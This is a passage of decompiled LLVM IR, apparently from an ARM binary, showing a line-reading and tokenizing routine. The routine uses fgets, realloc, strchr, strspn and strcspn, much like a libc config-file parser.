  %v3_ec48 = mul nuw nsw i32 %v1_ec3c, 4
  %v1_ec50 = or i32 %v3_ec48, 1
  %v1_ec5c = and i32 %arg3, 131072
  %v1_ec60 = add nsw i32 %v1_ec3c, -1
  %v1_ec6c = and i32 %arg3, 262144
  store i32 %v1_ec6c, i32* %r2.global-to-local, align 4
  %v1_ec70 = and i32 %arg3, 65536
  store i32 %v1_ec70, i32* %r3.global-to-local, align 4
  store i32 %v1_ec70, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_ec80 = add i32 %arg4, 1
  store i32 %v1_ec80, i32* @sl, align 4
  %v2_edf8 = icmp eq i32 %v1_ec5c, 0
  %v1_ee50 = inttoptr i32 %arg2 to i32*
  %v2_ee68 = icmp eq i32 %v1_ec6c, 0
  br label %dec_label_pc_ec84

dec_label_pc_ec84:                                ; preds = %dec_label_pc_ec84.backedge, %dec_label_pc_ec3c
  %v2_eca0 = phi i32 [ %v0_ec84.pre, %dec_label_pc_ec84.backedge ], [ %tmp, %dec_label_pc_ec3c ]
  %v1_ec84 = add i32 %v2_eca0, 4
  %v2_ec84 = inttoptr i32 %v1_ec84 to i32*
  %v3_ec84 = load i32, i32* %v2_ec84, align 4
  store i32 %v3_ec84, i32* %r3.global-to-local, align 4
  %v2_ec88 = icmp eq i32 %v3_ec84, 0
  store i1 %v2_ec88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec88, label %dec_label_pc_ec90, label %dec_label_pc_ecd8

dec_label_pc_ec90:                                ; preds = %dec_label_pc_ec84
  %v1_ec90 = add i32 %v2_eca0, 16
  %v2_ec90 = inttoptr i32 %v1_ec90 to i32*
  %v3_ec90 = load i32, i32* %v2_ec90, align 4
  store i32 %v3_ec90, i32* %r3.global-to-local, align 4
  %v2_ec94 = icmp eq i32 %v3_ec90, 0
  store i1 %v2_ec94, i1* %cpsr_z.global-to-local, align 1
  %v1_ec98 = add i32 %v2_eca0, 8
  %v2_ec98 = inttoptr i32 %v1_ec98 to i32*
  %v3_ec98 = load i32, i32* %v2_ec98, align 4
  store i32 %v3_ec98, i32* %r3.global-to-local, align 4
  br i1 %v2_ec94, label %bb, label %bb64

bb:                                               ; preds = %dec_label_pc_ec90
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_ec90, align 4
  %v0_eca4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_ec90, %bb
  %v0_eca4 = phi i32 [ %v0_eca4.pre, %bb ], [ %v3_ec98, %dec_label_pc_ec90 ]
  %v2_eca4 = icmp eq i32 %v0_eca4, 0
  store i1 %v2_eca4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eca4, label %bb65, label %.thread

bb65:                                             ; preds = %bb64
  store i32 %v1_ec50, i32* %r3.global-to-local, align 4
  %v2_ecac = load i32, i32* @r5, align 4
  %v3_ecac = add i32 %v2_ecac, 8
  %v4_ecac = inttoptr i32 %v3_ecac to i32*
  store i32 %v1_ec50, i32* %v4_ecac, align 4
  br label %.thread

.thread:                                          ; preds = %bb64, %bb65
  %v0_ecb0 = load i32, i32* @r5, align 4
  %v1_ecb0 = add i32 %v0_ecb0, 16
  %v2_ecb0 = inttoptr i32 %v1_ecb0 to i32*
  %v3_ecb0 = load i32, i32* %v2_ecb0, align 4
  store i32 %v3_ecb0, i32* %r0.global-to-local, align 4
  %v1_ecb4 = add i32 %v0_ecb0, 8
  %v2_ecb4 = inttoptr i32 %v1_ecb4 to i32*
  %v3_ecb4 = load i32, i32* %v2_ecb4, align 4
  store i32 %v3_ecb4, i32* %r3.global-to-local, align 4
  %v2_ecb8 = add i32 %v3_ecb4, %v3_ecb0
  store i32 %v2_ecb8, i32* %r0.global-to-local, align 4
  %v1_ecbc = call i32 @malloc(i32 %v2_ecb8)
  store i32 %v1_ecbc, i32* %r0.global-to-local, align 4
  %v2_ecc0 = icmp eq i32 %v1_ecbc, 0
  store i1 %v2_ecc0, i1* %cpsr_z.global-to-local, align 1
  %v1_ecc4 = load i32, i32* @r5, align 4
  %v2_ecc4 = add i32 %v1_ecc4, 4
  %v3_ecc4 = inttoptr i32 %v2_ecc4 to i32*
  store i32 %v1_ecbc, i32* %v3_ecc4, align 4
  br i1 %v2_ecc0, label %dec_label_pc_ef34, label %dec_label_pc_eccc

dec_label_pc_eccc:                                ; preds = %.thread
  %v0_eccc = load i32, i32* @r5, align 4
  %v1_eccc = add i32 %v0_eccc, 20
  %v2_eccc = inttoptr i32 %v1_eccc to i32*
  %v3_eccc = load i32, i32* %v2_eccc, align 4
  %v1_ecd0 = or i32 %v3_eccc, 1
  store i32 %v1_ecd0, i32* %r3.global-to-local, align 4
  store i32 %v1_ecd0, i32* %v2_eccc, align 4
  %v0_ecd8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_ecd8

dec_label_pc_ecd8:                                ; preds = %dec_label_pc_ec84, %dec_label_pc_eccc
  %v1_ece0 = phi i32 [ %v2_eca0, %dec_label_pc_ec84 ], [ %v0_ecd8.pre, %dec_label_pc_eccc ]
  %v1_ecd8 = add i32 %v1_ece0, 4
  %v2_ecd8 = inttoptr i32 %v1_ecd8 to i32*
  %v3_ecd8 = load i32, i32* %v2_ecd8, align 4
  store i32 %v3_ecd8, i32* %r2.global-to-local, align 4
  %v4_ecd8 = add i32 %v1_ece0, 8
  %v5_ecd8 = inttoptr i32 %v4_ecd8 to i32*
  %v6_ecd8 = load i32, i32* %v5_ecd8, align 4
  %v2_ecdc = add i32 %v6_ecd8, %v3_ecd8
  store i32 %v2_ecdc, i32* %r3.global-to-local, align 4
  %v2_ece0 = add i32 %v1_ece0, 12
  %v3_ece0 = inttoptr i32 %v2_ece0 to i32*
  store i32 %v2_ecdc, i32* %v3_ece0, align 4
  %v0_ece4 = load i32, i32* @fp, align 4
  store i32 %v0_ece4, i32* @r6, align 4
  br label %dec_label_pc_ece8

dec_label_pc_ece8:                                ; preds = %dec_label_pc_ed74, %dec_label_pc_ed60, %dec_label_pc_ecd8
  %v0_ecf0 = phi i32 [ %v0_ece4, %dec_label_pc_ecd8 ], [ %v1_ed60, %dec_label_pc_ed60 ], [ %v0_ecf0.pre.pre, %dec_label_pc_ed74 ]
  %v0_ece8 = load i32, i32* @r5, align 4
  %v1_ece8 = add i32 %v0_ece8, 12
  store i32 %v1_ece8, i32* %r0.global-to-local, align 4
  %v1_ecec = inttoptr i32 %v1_ece8 to i32*
  %v2_ecec = load i32, i32* %v1_ecec, align 4
  store i32 %v2_ecec, i32* %r0.global-to-local, align 4
  %v3_ecec = add i32 %v0_ece8, 16
  %v4_ecec = inttoptr i32 %v3_ecec to i32*
  %v5_ecec = load i32, i32* %v4_ecec, align 4
  %v2_ecf0 = add i32 %v2_ecec, %v0_ecf0
  store i32 %v2_ecf0, i32* %r0.global-to-local, align 4
  %v2_ecf4 = sub i32 %v5_ecec, %v0_ecf0
  %v1_ecf8 = inttoptr i32 %v0_ece8 to i32*
  %v2_ecf8 = load i32, i32* %v1_ecf8, align 4
  store i32 %v2_ecf8, i32* %r2.global-to-local, align 4
  %v3_ecfc = call i32 @fgets(i32 %v2_ecf0, i32 %v2_ecf4, i32 %v2_ecf8)
  store i32 %v3_ecfc, i32* %r0.global-to-local, align 4
  store i32 %v3_ecfc, i32* %r4.global-to-local, align 4
  %v2_ed00 = icmp eq i32 %v3_ecfc, 0
  store i1 %v2_ed00, i1* %cpsr_z.global-to-local, align 1
  %v0_ed08 = load i32, i32* @r5, align 4
  %v1_ed08 = add i32 %v0_ed08, 12
  br i1 %v2_ed00, label %dec_label_pc_ed08, label %dec_label_pc_ed20

dec_label_pc_ed08:                                ; preds = %dec_label_pc_ece8
  store i32 %v1_ed08, i32* %r0.global-to-local, align 4
  %v1_ed0c = inttoptr i32 %v1_ed08 to i32*
  %v2_ed0c = load i32, i32* %v1_ed0c, align 4
  store i32 %v2_ed0c, i32* %r0.global-to-local, align 4
  %v3_ed0c = add i32 %v0_ed08, 16
  %v4_ed0c = inttoptr i32 %v3_ed0c to i32*
  %v5_ed0c = load i32, i32* %v4_ed0c, align 4
  store i32 %v5_ed0c, i32* %r2.global-to-local, align 4
  %v3_ed14 = inttoptr i32 %v2_ed0c to i8*
  %v4_ed14 = call i32 @__GI_memset(i8* %v3_ed14, i32 0, i32 %v5_ed0c)
  store i32 %v4_ed14, i32* %r0.global-to-local, align 4
  %v0_ed18 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ef38

dec_label_pc_ed20:                                ; preds = %dec_label_pc_ece8
  %v2_ed20 = inttoptr i32 %v1_ed08 to i32*
  %v3_ed20 = load i32, i32* %v2_ed20, align 4
  store i32 %v3_ed20, i32* @r4, align 4
  %v1_ed24 = load i32, i32* @r6, align 4
  %v2_ed24 = add i32 %v1_ed24, %v3_ed20
  %v3_ed24 = inttoptr i32 %v2_ed24 to i8*
  store i32 %v2_ed24, i32* %r0.global-to-local, align 4
  %v3_ed28 = call i32 @strlen(i8* %v3_ed24)
  %v0_ed30 = load i32, i32* @r6, align 4
  %v2_ed30 = add i32 %v0_ed30, %v3_ed28
  store i32 %v2_ed30, i32* @r6, align 4
  %v0_ed34 = load i32, i32* @r4, align 4
  store i32 %v0_ed34, i32* @r0, align 4
  %v2_ed38 = call i32 @__GI_strchr(i32 %v0_ed34, i32 10)
  store i32 %v2_ed38, i32* %r0.global-to-local, align 4
  %v2_ed3c = icmp eq i32 %v2_ed38, 0
  store i1 %v2_ed3c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed3c, label %dec_label_pc_ed68, label %dec_label_pc_ed44

dec_label_pc_ed44:                                ; preds = %dec_label_pc_ed20
  %v1_ed44 = inttoptr i32 %v2_ed38 to i8*
  %v2_ed44 = load i8, i8* %v1_ed44, align 1
  %v3_ed44 = zext i8 %v2_ed44 to i32
  %v1_ed48 = add nuw nsw i32 %v3_ed44, 255
  %v1_ed4c = urem i32 %v1_ed48, 256
  store i32 %v1_ed4c, i32* %r3.global-to-local, align 4
  %v7_ed50 = icmp eq i32 %v1_ed4c, 92
  store i1 %v7_ed50, i1* %cpsr_z.global-to-local, align 1
  %v1_ed54 = trunc i32 %v1_ed48 to i8
  store i8 %v1_ed54, i8* %v1_ed44, align 1
  %v0_ed58 = load i32, i32* @r6, align 4
  %v1_ed58 = add i32 %v0_ed58, -1
  store i32 %v1_ed58, i32* @r6, align 4
  %v0_ed5c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ed5c, label %dec_label_pc_ed60, label %dec_label_pc_edec

dec_label_pc_ed60:                                ; preds = %dec_label_pc_ed44
  %v1_ed60 = add i32 %v0_ed58, -2
  store i32 %v1_ed60, i32* @r6, align 4
  br label %dec_label_pc_ece8

dec_label_pc_ed68:                                ; preds = %dec_label_pc_ed20
  %v0_ed68 = load i32, i32* @r5, align 4
  %v1_ed68 = add i32 %v0_ed68, 20
  %v2_ed68 = inttoptr i32 %v1_ed68 to i32*
  %v3_ed68 = load i32, i32* %v2_ed68, align 4
  store i32 %v3_ed68, i32* %r3.global-to-local, align 4
  %v2_ed6c = icmp eq i32 %v3_ed68, 0
  store i1 %v2_ed6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ed6c, label %dec_label_pc_eda4, label %dec_label_pc_ed74

dec_label_pc_ed74:                                ; preds = %dec_label_pc_ed68
  %v1_ed74 = add i32 %v0_ed68, 16
  %v2_ed74 = inttoptr i32 %v1_ed74 to i32*
  %v3_ed74 = load i32, i32* %v2_ed74, align 4
  store i32 %v3_ed74, i32* %r3.global-to-local, align 4
  %v1_ed78 = add i32 %v0_ed68, 8
  %v2_ed78 = inttoptr i32 %v1_ed78 to i32*
  %v3_ed78 = load i32, i32* %v2_ed78, align 4
  %v1_ed7c = add i32 %v3_ed74, 4096
  store i32 %v1_ed7c, i32* %r3.global-to-local, align 4
  %v2_ed80 = add i32 %v3_ed78, %v1_ed7c
  store i32 %v1_ed7c, i32* %v2_ed74, align 4
  %v0_ed88 = load i32, i32* @r5, align 4
  %v1_ed88 = add i32 %v0_ed88, 4
  %v2_ed88 = inttoptr i32 %v1_ed88 to i32*
  %v3_ed88 = load i32, i32* %v2_ed88, align 4
  store i32 %v3_ed88, i32* %r0.global-to-local, align 4
  %v2_ed8c = inttoptr i32 %v3_ed88 to i32*
  %v3_ed8c = call i32 @realloc(i32* %v2_ed8c, i32 %v2_ed80)
  store i32 %v3_ed8c, i32* %r0.global-to-local, align 4
  %v0_ed90 = load i32, i32* @r5, align 4
  %v1_ed90 = add i32 %v0_ed90, 8
  %v2_ed90 = inttoptr i32 %v1_ed90 to i32*
  %v3_ed90 = load i32, i32* %v2_ed90, align 4
  %v2_ed94 = add i32 %v3_ed90, %v3_ed8c
  store i32 %v2_ed94, i32* %r3.global-to-local, align 4
  %v2_ed98 = add i32 %v0_ed90, 12
  %v3_ed98 = inttoptr i32 %v2_ed98 to i32*
  store i32 %v2_ed94, i32* %v3_ed98, align 4
  %v1_ed9c = load i32, i32* @r5, align 4
  %v2_ed9c = add i32 %v1_ed9c, 4
  %v3_ed9c = inttoptr i32 %v2_ed9c to i32*
  store i32 %v3_ed8c, i32* %v3_ed9c, align 4
  %v0_ecf0.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_ece8

dec_label_pc_eda4:                                ; preds = %dec_label_pc_ed68, %.dec_label_pc_eda4_crit_edge
  %v0_eda4 = phi i32 [ %v0_eda4.pre, %.dec_label_pc_eda4_crit_edge ], [ %v0_ed68, %dec_label_pc_ed68 ]
  %v1_eda4 = inttoptr i32 %v0_eda4 to i32*
  %v2_eda4 = load i32, i32* %v1_eda4, align 4
  store i32 %v2_eda4, i32* @r1, align 4
  %v1_eda8 = add i32 %v2_eda4, 52
  %v2_eda8 = inttoptr i32 %v1_eda8 to i32*
  %v3_eda8 = load i32, i32* %v2_eda8, align 4
  store i32 %v3_eda8, i32* %r3.global-to-local, align 4
  %v2_edac = icmp eq i32 %v3_eda8, 0
  store i1 %v2_edac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_edac, label %dec_label_pc_edd8, label %dec_label_pc_edb4

dec_label_pc_edb4:                                ; preds = %dec_label_pc_eda4
  %v1_edb4 = add i32 %v2_eda4, 16
  %v2_edb4 = inttoptr i32 %v1_edb4 to i32*
  %v3_edb4 = load i32, i32* %v2_edb4, align 4
  store i32 %v3_edb4, i32* %r2.global-to-local, align 4
  %v1_edb8 = add i32 %v2_eda4, 24
  %v2_edb8 = inttoptr i32 %v1_edb8 to i32*
  %v3_edb8 = load i32, i32* %v2_edb8, align 4
  store i32 %v3_edb8, i32* %r3.global-to-local, align 4
  %v3_edbc = icmp ult i32 %v3_edb4, %v3_edb8
  %v9_edbc = icmp eq i32 %v3_edb4, %v3_edb8
  store i1 %v9_edbc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_edbc, label %dec_label_pc_ede0thread-pre-split, label %dec_label_pc_edcc

dec_label_pc_edcc:                                ; preds = %dec_label_pc_edb4
  store i32 %v2_eda4, i32* %r0.global-to-local, align 4
  %v1_edd0 = inttoptr i32 %v2_eda4 to i16*
  %v2_edd0 = call i32 @getc_unlocked(i16* %v1_edd0)
  store i32 %v2_edd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ede0

dec_label_pc_edd8:                                ; preds = %dec_label_pc_eda4
  store i32 %v2_eda4, i32* %r0.global-to-local, align 4
  %v1_eddc = call i32 @__GI_fgetc(i32 %v2_eda4)
  store i32 %v1_eddc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ede0

dec_label_pc_ede0thread-pre-split:                ; preds = %dec_label_pc_edb4
  %v2_edc0 = inttoptr i32 %v3_edb4 to i8*
  %v3_edc0 = load i8, i8* %v2_edc0, align 1
  %v4_edc0 = zext i8 %v3_edc0 to i32
  store i32 %v4_edc0, i32* %r0.global-to-local, align 4
  %v6_edc0 = add i32 %v3_edb4, 1
  store i32 %v6_edc0, i32* %r2.global-to-local, align 4
  store i32 %v6_edc0, i32* %v2_edb4, align 4
  %v0_ede0.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ede0

dec_label_pc_ede0:                                ; preds = %dec_label_pc_ede0thread-pre-split, %dec_label_pc_edcc, %dec_label_pc_edd8
  %v1_ede4 = phi i32 [ %v0_ede0.pr, %dec_label_pc_ede0thread-pre-split ], [ %v2_edd0, %dec_label_pc_edcc ], [ %v1_eddc, %dec_label_pc_edd8 ]
  %v7_ede0 = icmp eq i32 %v1_ede4, 10
  store i1 %v7_ede0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ede0, label %dec_label_pc_edec.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_ede0
  %v8_ede4 = icmp eq i32 %v1_ede4, -1
  store i1 %v8_ede4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ede4, label %dec_label_pc_edec.loopexit, label %.dec_label_pc_eda4_crit_edge

.dec_label_pc_eda4_crit_edge:                     ; preds = %bb66
  %v0_eda4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_eda4

dec_label_pc_edec.loopexit:                       ; preds = %bb66, %dec_label_pc_ede0
  %v0_edec.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_edec

dec_label_pc_edec:                                ; preds = %dec_label_pc_ed44, %dec_label_pc_edec.loopexit
  %v0_edec = phi i32 [ %v0_edec.pre, %dec_label_pc_edec.loopexit ], [ %v1_ed58, %dec_label_pc_ed44 ]
  %v7_edec = icmp eq i32 %v0_edec, -1
  store i1 %v7_edec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_edec, label %dec_label_pc_ef34, label %dec_label_pc_edf4

dec_label_pc_edf4:                                ; preds = %dec_label_pc_edec
  store i32 %v1_ec5c, i32* %r3.global-to-local, align 4
  store i1 %v2_edf8, i1* %cpsr_z.global-to-local, align 1
  %v0_edfc = load i32, i32* @r5, align 4
  %v1_edfc = add i32 %v0_edfc, 12
  %v2_edfc = inttoptr i32 %v1_edfc to i32*
  %v3_edfc = load i32, i32* %v2_edfc, align 4
  store i32 %v3_edfc, i32* @r4, align 4
  br i1 %v2_edf8, label %dec_label_pc_ee14, label %dec_label_pc_ee04

dec_label_pc_ee04:                                ; preds = %dec_label_pc_edf4
  store i32 %v3_edfc, i32* @r0, align 4
  %v1_ee0c = inttoptr i32 %v3_edfc to i8*
  %v2_ee0c = call i32 @__GI_strspn(i8* %v1_ee0c)
  store i32 %v2_ee0c, i32* %r0.global-to-local, align 4
  %v0_ee10 = load i32, i32* @r4, align 4
  %v2_ee10 = add i32 %v0_ee10, %v2_ee0c
  store i32 %v2_ee10, i32* @r4, align 4
  br label %dec_label_pc_ee14

dec_label_pc_ee14:                                ; preds = %dec_label_pc_edf4, %dec_label_pc_ee04
  %v0_ee14 = phi i32 [ %v3_edfc, %dec_label_pc_edf4 ], [ %v2_ee10, %dec_label_pc_ee04 ]
  %v1_ee14 = inttoptr i32 %v0_ee14 to i8*
  %v2_ee14 = load i8, i8* %v1_ee14, align 1
  %v3_ee14 = zext i8 %v2_ee14 to i32
  store i32 %v3_ee14, i32* %r2.global-to-local, align 4
  %v2_ee18 = icmp eq i8 %v2_ee14, 0
  store i1 %v2_ee18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee18, label %dec_label_pc_ec84.backedge, label %dec_label_pc_ee20

dec_label_pc_ec84.backedge:                       ; preds = %dec_label_pc_ee14, %dec_label_pc_ee20, %dec_label_pc_ef2c
  %v0_ec84.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_ec84

dec_label_pc_ee20:                                ; preds = %dec_label_pc_ee14
  %v0_ee20 = load i32, i32* @r7, align 4
  %v1_ee20 = inttoptr i32 %v0_ee20 to i8*
  %v2_ee20 = load i8, i8* %v1_ee20, align 1
  %v3_ee20 = zext i8 %v2_ee20 to i32
  store i32 %v3_ee20, i32* %r3.global-to-local, align 4
  %v9_ee24 = icmp eq i8 %v2_ee20, %v2_ee14
  store i1 %v9_ee24, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ee24, label %dec_label_pc_ec84.backedge, label %dec_label_pc_ee2c

dec_label_pc_ee2c:                                ; preds = %dec_label_pc_ee20
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_ee30 = load i32, i32* @r5, align 4
  %v1_ee30 = add i32 %v0_ee30, 4
  %v2_ee30 = inttoptr i32 %v1_ee30 to i32*
  %v3_ee30 = load i32, i32* %v2_ee30, align 4
  store i32 %v3_ee30, i32* %r0.global-to-local, align 4
  %v0_ee34 = load i32, i32* @fp, align 4
  store i32 %v3_ee30, i32* %v1_ee50, align 4
  store i32 %v3_ec48, i32* %r2.global-to-local, align 4
  %v3_ee40 = inttoptr i32 %v3_ee30 to i8*
  %v4_ee40 = call i32 @__GI_memset(i8* %v3_ee40, i32 %v0_ee34, i32 %v3_ec48)
  store i32 %v4_ee40, i32* %r0.global-to-local, align 4
  %v0_ee44 = load i32, i32* @fp, align 4
  store i32 %v0_ee44, i32* @r6, align 4
  %v0_ef0412 = load i32, i32* @r4, align 4
  %v1_ef0413 = inttoptr i32 %v0_ef0412 to i8*
  %v2_ef0414 = load i8, i8* %v1_ef0413, align 1
  %v3_ef0415 = zext i8 %v2_ef0414 to i32
  store i32 %v3_ef0415, i32* %r2.global-to-local, align 4
  %v2_ef0816 = icmp eq i8 %v2_ef0414, 0
  store i1 %v2_ef0816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef0816, label %dec_label_pc_ef20, label %dec_label_pc_ef10

dec_label_pc_ee4c:                                ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_ee50 = load i32, i32* %v1_ee50, align 4
  store i32 %v2_ee50, i32* %r3.global-to-local, align 4
  store i32 %v1_ec60, i32* %r2.global-to-local, align 4
  %v9_ee58 = icmp eq i32 %v2_ee5c, %v1_ec60
  store i1 %v9_ee58, i1* %cpsr_z.global-to-local, align 1
  %v5_ee5c = mul i32 %v2_ee5c, 4
  %v6_ee5c = add i32 %v2_ee50, %v5_ee5c
  %v7_ee5c = inttoptr i32 %v6_ee5c to i32*
  store i32 %v0_ee5c, i32* %v7_ee5c, align 4
  br i1 %v9_ee58, label %dec_label_pc_ee64, label %dec_label_pc_ee70

dec_label_pc_ee64:                                ; preds = %dec_label_pc_ee4c
  store i32 %v1_ec6c, i32* %r3.global-to-local, align 4
  store i1 %v2_ee68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee68, label %dec_label_pc_ee70, label %dec_label_pc_ee90

dec_label_pc_ee70:                                ; preds = %dec_label_pc_ee64, %dec_label_pc_ee4c
  %v0_ee70 = load i32, i32* @r7, align 4
  %v1_ee70 = inttoptr i32 %v0_ee70 to i8*
  %v2_ee70 = load i8, i8* %v1_ee70, align 1
  %v3_ee70 = zext i8 %v2_ee70 to i32
  store i32 %v3_ee70, i32* %r3.global-to-local, align 4
  %v2_ee74 = icmp eq i8 %v2_ee70, 0
  store i1 %v2_ee74, i1* %cpsr_z.global-to-local, align 1
  %v0_ee78 = load i32, i32* @r4, align 4
  store i32 %v0_ee78, i32* @r0, align 4
  %v1_ee7c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_ee74, i32 %v1_ee7c, i32 %v0_ee70
  store i32 %storemerge, i32* @r1, align 4
  %v0_ee84 = call i32 @strcspn()
  store i32 %v0_ee84, i32* %r0.global-to-local, align 4
  %v0_ee88 = load i32, i32* @r4, align 4
  %v2_ee88 = add i32 %v0_ee88, %v0_ee84
  store i32 %v2_ee88, i32* @r4, align 4
  br label %dec_label_pc_eec8

dec_label_pc_ee90:                                ; preds = %dec_label_pc_ee64
  %v0_ee90 = load i32, i32* @r4, align 4
  store i32 %v0_ee90, i32* @r0, align 4
  %v0_ee94 = load i32, i32* @r7, align 4
  %v1_ee94 = inttoptr i32 %v0_ee94 to i8*
  %v2_ee94 = load i8, i8* %v1_ee94, align 1
  %v3_ee94 = zext i8 %v2_ee94 to i32
  %v5_ee98 = call i32 @__GI_strchrnul(i32 %v0_ee90, i32 %v3_ee94, i32 %v1_ec60, i32 %v1_ec6c)
  store i32 %v5_ee98, i32* %r0.global-to-local, align 4
  store i32 %v1_ec5c, i32* %r2.global-to-local, align 4
  store i1 %v2_edf8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_ee98, i32* @r4, align 4
  br i1 %v2_edf8, label %dec_label_pc_eec8, label %dec_label_pc_eeb4

dec_label_pc_eeb0:                                ; preds = %dec_label_pc_eeb4
  %v1_eeb0 = add i32 %v0_eec8.pre, -1
  store i32 %v1_eeb0, i32* @r4, align 4
  br label %dec_label_pc_eeb4

dec_label_pc_eeb4:                                ; preds = %dec_label_pc_ee90, %dec_label_pc_eeb0
  %v0_eeb4 = phi i32 [ %v1_eeb0, %dec_label_pc_eeb0 ], [ %v5_ee98, %dec_label_pc_ee90 ]
  %v1_eeb4 = add i32 %v0_eeb4, -1
  %v2_eeb4 = inttoptr i32 %v1_eeb4 to i8*
  %v3_eeb4 = load i8, i8* %v2_eeb4, align 1
  %v4_eeb4 = zext i8 %v3_eeb4 to i32
  %v0_eeb8 = load i32, i32* @sl, align 4
  store i32 %v0_eeb8, i32* @r0, align 4
  %v2_eebc = call i32 @__GI_strchr(i32 %v0_eeb8, i32 %v4_eeb4)
  store i32 %v2_eebc, i32* %r0.global-to-local, align 4
  %v2_eec0 = icmp eq i32 %v2_eebc, 0
  store i1 %v2_eec0, i1* %cpsr_z.global-to-local, align 1
  %v0_eec8.pre = load i32, i32* @r4, align 4
  br i1 %v2_eec0, label %dec_label_pc_eec8, label %dec_label_pc_eeb0

dec_label_pc_eec8:                                ; preds = %dec_label_pc_eeb4, %dec_label_pc_ee90, %dec_label_pc_ee70
  %v3_eed4 = phi i32 [ %v5_ee98, %dec_label_pc_ee90 ], [ %v2_ee88, %dec_label_pc_ee70 ], [ %v0_eec8.pre, %dec_label_pc_eeb4 ]
  %v1_eec8 = inttoptr i32 %v3_eed4 to i8*
  %v2_eec8 = load i8, i8* %v1_eec8, align 1
  %v3_eec8 = zext i8 %v2_eec8 to i32
  store i32 %v3_eec8, i32* %r2.global-to-local, align 4
  %v0_eecc = load i32, i32* @r7, align 4
  %v1_eecc = inttoptr i32 %v0_eecc to i8*
  %v2_eecc = load i8, i8* %v1_eecc, align 1
  %v3_eecc = zext i8 %v2_eecc to i32
  store i32 %v3_eecc, i32* %r3.global-to-local, align 4
  %v9_eed0 = icmp eq i8 %v2_eecc, %v2_eec8
  store i1 %v9_eed0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_eed0, label %bb69, label %dec_label_pc_eedc

bb69:                                             ; preds = %dec_label_pc_eec8
  %v1_eed4 = load i32, i32* @fp, align 4
  %v2_eed4 = trunc i32 %v1_eed4 to i8
  store i8 %v2_eed4, i8* %v1_eec8, align 1
  %v0_eed8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_eed8.pr, label %bb71, label %.dec_label_pc_eedc_crit_edge

.dec_label_pc_eedc_crit_edge:                     ; preds = %bb69
  %v0_eedc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_eedc

dec_label_pc_eedc:                                ; preds = %.dec_label_pc_eedc_crit_edge, %dec_label_pc_eec8
  %v0_eedc = phi i32 [ %v0_eedc.pre, %.dec_label_pc_eedc_crit_edge ], [ %v3_eec8, %dec_label_pc_eec8 ]
  %v2_eedc = icmp eq i32 %v0_eedc, 0
  store i1 %v2_eedc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eedc, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_eedc
  %v1_eee0 = load i32, i32* @fp, align 4
  %v2_eee0 = trunc i32 %v1_eee0 to i8
  %v3_eee0 = load i32, i32* @r4, align 4
  %v4_eee0 = inttoptr i32 %v3_eee0 to i8*
  store i8 %v2_eee0, i8* %v4_eee0, align 1
  %v5_eee0 = load i32, i32* @r4, align 4
  %v6_eee0 = add i32 %v5_eee0, 1
  store i32 %v6_eee0, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_eedc, %bb70
  %v2_eee4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_eee4, i32* %r3.global-to-local, align 4
  %v2_eee8 = icmp eq i32 %v2_eee4, 0
  store i1 %v2_eee8, i1* %cpsr_z.global-to-local, align 1
  %v0_ef04.pre = load i32, i32* @r4, align 4
  br i1 %v2_eee8, label %dec_label_pc_ef00, label %dec_label_pc_eef0

dec_label_pc_eef0:                                ; preds = %bb71
  store i32 %v0_ef04.pre, i32* @r0, align 4
  %v1_eef8 = inttoptr i32 %v0_ef04.pre to i8*
  %v2_eef8 = call i32 @__GI_strspn(i8* %v1_eef8)
  store i32 %v2_eef8, i32* %r0.global-to-local, align 4
  %v0_eefc = load i32, i32* @r4, align 4
  %v2_eefc = add i32 %v0_eefc, %v2_eef8
  store i32 %v2_eefc, i32* @r4, align 4
  br label %dec_label_pc_ef00

dec_label_pc_ef00:                                ; preds = %bb71, %dec_label_pc_eef0
  %v0_ef04 = phi i32 [ %v2_eefc, %dec_label_pc_eef0 ], [ %v0_ef04.pre, %bb71 ]
  %v0_ef00 = load i32, i32* @r6, align 4
  %v1_ef00 = add i32 %v0_ef00, 1
  store i32 %v1_ef00, i32* @r6, align 4
  %v1_ef04 = inttoptr i32 %v0_ef04 to i8*
  %v2_ef04 = load i8, i8* %v1_ef04, align 1
  %v3_ef04 = zext i8 %v2_ef04 to i32
  store i32 %v3_ef04, i32* %r2.global-to-local, align 4
  %v2_ef08 = icmp eq i8 %v2_ef04, 0
